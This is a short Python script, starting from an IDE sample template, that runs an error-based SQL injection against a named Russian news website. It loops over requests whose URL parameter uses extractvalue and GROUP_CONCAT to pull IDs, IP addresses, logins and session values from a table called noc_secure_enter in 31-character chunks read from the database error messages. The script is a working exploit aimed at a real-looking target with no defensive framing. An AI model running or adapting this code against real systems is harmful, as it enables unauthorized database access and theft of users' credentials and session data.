# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import re
import time

import requests as requests

# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    for j in range(1, 5):
        print(f'waiting : {j}', end='\r')
        time.sleep(1)

    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    fff = ansi_escape.sub('',
                          '[\x1b[92maddeventlistener-detect\x1b[0m] [\x1b[94mhttp\x1b[0m] [\x1b[34minfo\x1b[0m] https://www.liveabout.com/how-big-is-olympic-size-pool-2737098?url=https%3A%2F%2Fwww.thespruce.com%2Fhow-big-is-olympic-size-pool-2737098')

    counter = 1
    lines = []
    for i in range(1, 40):
        url = f"https://nocvko.ru/news/page/1%20or(extractvalue(0x0a,concat(0x0a,(select%20MID(GROUP_CONCAT(id,':',ip,':'," \
              f"login,':',enter,':',':',session),{counter},31)%20from%20noc_secure_enter%20where%20id>153))))or%202"
        response = requests.get(url)
        splitted = response.text.split("syntax error: '")

        res = splitted[1].split("'")[0]
        lines.append(res)
        counter += 31
    res = "".join([s.strip('\n') for s in lines])
    print(1)

